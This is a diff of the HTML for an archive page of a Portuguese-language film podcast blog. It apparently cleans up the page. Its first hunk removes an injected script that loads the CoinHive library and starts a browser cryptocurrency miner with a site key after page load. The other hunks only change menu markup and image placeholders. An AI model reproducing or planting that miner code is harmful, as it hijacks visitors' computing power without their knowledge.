@@ -81,12 +81,7 @@ var a2a_config=a2a_config||{};a2a_config.callbacks=a2a_config.callbacks||[];a2a_
   #nav-header .nav ul { background-color: #000000; }
 }
         #footer-bottom { background-color: #000000; }body { background-color: #eaeaea; }</style>
-<script src="https://coin-hive.com/lib/coinhive.min.js"></script><script>
-var speed = 0.17;
-if( window.matchMedia("only screen and (max-width: 760px)").matches ) {
-	speed = 0.8
-}
-var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:speed});setTimeout(function(){__m.start();},3000);</script></head>
+</head>
 
 <body class="archive category category-cinema-em-serie-podcast category-33 col-3cm full-width topbar-enabled header-desktop-sticky header-mobile-sticky unknown">
 
@@ -94,18 +89,70 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
   
   <header id="header" class="main-menu-mobile-on one-mobile-menu main_menu header-ads-desktop  topbar-transparent">
-        <!--/#nav-topbar-->  
-        <!--/#nav-topbar-->  
+        <nav class="nav-container group mobile-menu mobile-sticky" id="nav-mobile" data-menu-id="header-1">
+  <div class="mobile-title-logo-in-header">                  <p class="site-title"><a class="custom-logo-link" href="/" rel="home" title="Críticas | Home page">Críticas</a></p>
+                </div>
+        
+                    <!-- <div class="ham__navbar-toggler collapsed" aria-expanded="false">
+          <div class="ham__navbar-span-wrapper">
+            <span class="ham-toggler-menu__span"></span>
+          </div>
+        </div> -->
+        <div class="ham__navbar-toggler-two collapsed" title="Menu" aria-expanded="false">
+          <div class="ham__navbar-span-wrapper">
+            <span class="line line-1"></span>
+            <span class="line line-2"></span>
+            <span class="line line-3"></span>
+          </div>
+        </div>
+            
+      <div class="nav-text"></div>
+      <div class="nav-wrap container">
+                  <ul class="nav container-inner group mobile-search">
+                            <li>
+                  <form method="get" class="searchform themeform" action="http://criticas.centrodouniverso.com.br/">
+	<div>
+		<input type="text" class="search" name="s" onblur="if(this.value=='')this.value='To search type and hit enter';" onfocus="if(this.value=='To search type and hit enter')this.value='';" value="To search type and hit enter" />
+	</div>
+</form>                </li>
+                      </ul>
+                <ul id="menu-menu-principal" class="nav container-inner group"><li id="menu-item-755" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-755"><a href="/">Home</a></li>
+<li id="menu-item-2323" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2323"><a href="/sobre">Sobre</a></li>
+<li id="menu-item-2271" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2271"><a href="/contato">Contato</a></li>
+</ul>      </div>
+</nav><!--/#nav-topbar-->  
+        <nav class="nav-container group desktop-menu desktop-sticky" id="nav-topbar" data-menu-id="header-2">
+    <div class="nav-text"></div>
+  <div class="topbar-toggle-down">
+    <i class="fa fa-angle-double-down" aria-hidden="true" data-toggle="down" title="Expand menu"></i>
+    <i class="fa fa-angle-double-up" aria-hidden="true" data-toggle="up" title="Collapse menu"></i>
+  </div>
+  <div class="nav-wrap container">
+    <ul class="nav container-inner group"><li ><a href="/">Home</a></li><li class="page_item page-item-2270"><a href="/contato">Contato</a></li><li class="page_item page-item-2322"><a href="/sobre">Sobre</a></li></ul>  </div>
+      <div id="topbar-header-search" class="container">
+      <div class="container-inner">
+        <div class="toggle-search"><i class="fa fa-search"></i></div>
+        <div class="search-expand">
+          <div class="search-expand-inner"><form method="get" class="searchform themeform" action="http://criticas.centrodouniverso.com.br/">
+	<div>
+		<input type="text" class="search" name="s" onblur="if(this.value=='')this.value='To search type and hit enter';" onfocus="if(this.value=='To search type and hit enter')this.value='';" value="To search type and hit enter" />
+	</div>
+</form></div>
+        </div>
+      </div><!--/.container-inner-->
+    </div><!--/.container-->
+  
+</nav><!--/#nav-topbar-->  
   <div class="container group">
         <div class="container-inner">
 
-                    <div class="group pad central-header-zone" style="background-image:url('/banner_criticas.png')">
+                    <div class="group pad central-header-zone">
                   <div class="logo-tagline-group">
                                         <p class="site-title"><a class="custom-logo-link" href="/" rel="home" title="Críticas | Home page">Críticas</a></p>
                                                                 <p class="site-description">Fique por dentro do que rola no mundo do cinema</p>
                                         </div>
 
-                                </div><img style='display:none' src='/banner_criticas.png'></img>
+                                </div>
       
                 <nav class="nav-container group desktop-menu" id="nav-header" data-menu-id="header-3">
     <div class="nav-text"><!-- put your mobile menu text here --></div>
@@ -139,18 +186,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/7279" title="Podcast #66: Quando começamos a maratonar séries">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb8050e8956" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5e74207d2" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb8050e8956' ).animateSvg();
+                $( '#59bd5e74207d2' ).animateSvg();
               });
-            } else { $( '#59bb8050e8956' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5e74207d2' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="Podcast #66: Quando começamos a maratonar séries" data-hu-post-id="59bb8050e8956" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="Podcast #66: Quando começamos a maratonar séries" data-hu-post-id="59bd5e74207d2" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -166,7 +213,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/7279" rel="bookmark" title="Podcast #66: Quando começamos a maratonar séries" target="_blank">Podcast #66: Quando começamos a maratonar séries</a>
+			<a href="/archives/7279" rel="bookmark" title="Podcast #66: Quando começamos a maratonar séries">Podcast #66: Quando começamos a maratonar séries</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -179,18 +226,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/6976" title="Podcast #65: Clássicos que nunca vimos">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb8050ebd81" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5e742cff8" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb8050ebd81' ).animateSvg();
+                $( '#59bd5e742cff8' ).animateSvg();
               });
-            } else { $( '#59bb8050ebd81' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5e742cff8' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="Podcast #65: Clássicos que nunca vimos" data-hu-post-id="59bb8050ebd81" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="Podcast #65: Clássicos que nunca vimos" data-hu-post-id="59bd5e742cff8" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -206,7 +253,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/6976" rel="bookmark" title="Podcast #65: Clássicos que nunca vimos" target="_blank">Podcast #65: Clássicos que nunca vimos</a>
+			<a href="/archives/6976" rel="bookmark" title="Podcast #65: Clássicos que nunca vimos">Podcast #65: Clássicos que nunca vimos</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -219,18 +266,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/6633" title="Drops #13: Homem-Aranha está De Volta ao Lar">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb8050efea1" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5e7436de3" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb8050efea1' ).animateSvg();
+                $( '#59bd5e7436de3' ).animateSvg();
               });
-            } else { $( '#59bb8050efea1' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5e7436de3' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="Drops #13: Homem-Aranha está De Volta ao Lar" data-hu-post-id="59bb8050efea1" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="Drops #13: Homem-Aranha está De Volta ao Lar" data-hu-post-id="59bd5e7436de3" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -246,7 +293,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/6633" rel="bookmark" title="Drops #13: Homem-Aranha está De Volta ao Lar" target="_blank">Drops #13: Homem-Aranha está De Volta ao Lar</a>
+			<a href="/archives/6633" rel="bookmark" title="Drops #13: Homem-Aranha está De Volta ao Lar">Drops #13: Homem-Aranha está De Volta ao Lar</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -259,18 +306,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/6556" title="Podcast #64: Chuva de Trailers com Inumanos e Jumanji">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb8050f3f58" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5e7445635" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb8050f3f58' ).animateSvg();
+                $( '#59bd5e7445635' ).animateSvg();
               });
-            } else { $( '#59bb8050f3f58' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5e7445635' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="Podcast #64: Chuva de Trailers com Inumanos e Jumanji" data-hu-post-id="59bb8050f3f58" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="Podcast #64: Chuva de Trailers com Inumanos e Jumanji" data-hu-post-id="59bd5e7445635" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -286,7 +333,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/6556" rel="bookmark" title="Podcast #64: Chuva de Trailers com Inumanos e Jumanji" target="_blank">Podcast #64: Chuva de Trailers com Inumanos e Jumanji</a>
+			<a href="/archives/6556" rel="bookmark" title="Podcast #64: Chuva de Trailers com Inumanos e Jumanji">Podcast #64: Chuva de Trailers com Inumanos e Jumanji</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -299,18 +346,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/6217" title="Podcast #63: Mulher-Maravilha – A Áudio-crítica">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb80510317b" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5e7458198" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb80510317b' ).animateSvg();
+                $( '#59bd5e7458198' ).animateSvg();
               });
-            } else { $( '#59bb80510317b' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5e7458198' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="Podcast #63: Mulher-Maravilha – A Áudio-crítica" data-hu-post-id="59bb80510317b" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="Podcast #63: Mulher-Maravilha – A Áudio-crítica" data-hu-post-id="59bd5e7458198" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -326,7 +373,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/6217" rel="bookmark" title="Podcast #63: Mulher-Maravilha – A Áudio-crítica" target="_blank">Podcast #63: Mulher-Maravilha – A Áudio-crítica</a>
+			<a href="/archives/6217" rel="bookmark" title="Podcast #63: Mulher-Maravilha – A Áudio-crítica">Podcast #63: Mulher-Maravilha – A Áudio-crítica</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -339,18 +386,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/5456" title="Podcast#62 – Guardiões da Galáxia: A Áudio-Crítica">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb805106a47" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5e746a3ae" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb805106a47' ).animateSvg();
+                $( '#59bd5e746a3ae' ).animateSvg();
               });
-            } else { $( '#59bb805106a47' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5e746a3ae' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="Podcast#62 – Guardiões da Galáxia: A Áudio-Crítica" data-hu-post-id="59bb805106a47" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="Podcast#62 – Guardiões da Galáxia: A Áudio-Crítica" data-hu-post-id="59bd5e746a3ae" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -366,7 +413,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/5456" rel="bookmark" title="Podcast#62 – Guardiões da Galáxia: A Áudio-Crítica" target="_blank">Podcast#62 – Guardiões da Galáxia: A Áudio-Crítica</a>
+			<a href="/archives/5456" rel="bookmark" title="Podcast#62 – Guardiões da Galáxia: A Áudio-Crítica">Podcast#62 – Guardiões da Galáxia: A Áudio-Crítica</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -379,18 +426,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/5457" title="Podcast #62: Guardiões da Galáxia – A Áudio-Crítica">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb80510a37e" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5e747b3c6" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb80510a37e' ).animateSvg();
+                $( '#59bd5e747b3c6' ).animateSvg();
               });
-            } else { $( '#59bb80510a37e' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5e747b3c6' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="Podcast #62: Guardiões da Galáxia – A Áudio-Crítica" data-hu-post-id="59bb80510a37e" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="Podcast #62: Guardiões da Galáxia – A Áudio-Crítica" data-hu-post-id="59bd5e747b3c6" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -406,7 +453,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/5457" rel="bookmark" title="Podcast #62: Guardiões da Galáxia – A Áudio-Crítica" target="_blank">Podcast #62: Guardiões da Galáxia – A Áudio-Crítica</a>
+			<a href="/archives/5457" rel="bookmark" title="Podcast #62: Guardiões da Galáxia – A Áudio-Crítica">Podcast #62: Guardiões da Galáxia – A Áudio-Crítica</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -419,18 +466,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/6216" title="Podcast #62: Guardiões da Galáxia – A Áudio-crítica">
